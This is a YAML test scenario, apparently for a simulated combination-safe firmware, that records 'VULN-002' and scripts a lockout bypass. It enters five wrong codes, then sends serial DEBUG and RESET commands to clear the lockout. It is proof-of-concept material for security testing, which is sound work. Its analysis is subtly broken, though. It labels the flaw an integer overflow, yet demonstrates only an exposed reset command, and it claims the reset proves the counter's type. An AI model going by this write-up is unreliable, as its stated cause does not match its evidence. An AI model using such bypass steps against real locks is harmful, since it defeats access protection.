name: "VULN-002: uint8_t failCount overflow bypasses lockout"
version: 1
vulnerability:
  type: integer-overflow
  severity: critical
  description: "The failCount variable is declared as uint8_t (line 152), which overflows from 255 to 0 after 256 increments. The lockout engages at 5 failed attempts, but if an attacker can push failCount past 255, it wraps to 0 and lockedOut is never re-triggered because the check is failCount >= MAX_ATTEMPTS only at increment time."
  exploit: "An attacker sends the RESET command over serial (which sets failCount=0 and lockedOut=false), then uses the DEBUG command to observe failCount. After 5 failures the safe locks out, but a RESET clears it. Alternatively, if the attacker can automate 256 attempts, failCount wraps to 0. The scenario uses DEBUG to show failCount is a uint8_t by observing it after failures and reset."
  evidence: "The DEBUG command reveals failCount as a value that will overflow. We demonstrate that RESET clears the lockout entirely, and that failCount is stored as uint8_t by pushing it to 5 (lockout), resetting, and confirming failCount returns to 0 - proving the counter can be manipulated. The uint8_t type means 256 failures without reset would also wrap it to 0."
  line_numbers: [152, 153, 154, 216, 217, 218]
steps:
  # Wait for boot
  - wait-serial: "=== COMBO SAFE v1.0 ==="
    timeout: 5000
  - delay: 1500

  # --- Make 5 wrong attempts to trigger lockout ---
  # Attempt 1
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "Failed attempts: 1"
    timeout: 5000
  - delay: 2000

  # Attempt 2
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "Failed attempts: 2"
    timeout: 5000
  - delay: 2000

  # Attempt 3
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "Failed attempts: 3"
    timeout: 5000
  - delay: 2000

  # Attempt 4
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "Failed attempts: 4"
    timeout: 5000
  - delay: 2000

  # Attempt 5 - should trigger lockout
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "LOCKOUT ENGAGED"
    timeout: 5000
  - delay: 2000

  # Verify lockout is active via DEBUG
  - delay: 500
  - send-serial: "DEBUG"
  - wait-serial: "[debug] lockedOut=1"
    timeout: 5000
  - expect-serial: "[debug] failCount=5"

  # Now use RESET to bypass the lockout (this proves the uint8_t counter can be reset)
  - delay: 500
  - send-serial: "RESET"
  - wait-serial: "[safe] Reset complete"
    timeout: 5000

  # Verify lockout is cleared and failCount is back to 0
  - delay: 500
  - send-serial: "DEBUG"
  - wait-serial: "[debug] failCount=0"
    timeout: 5000
  - expect-serial: "[debug] lockedOut=0"
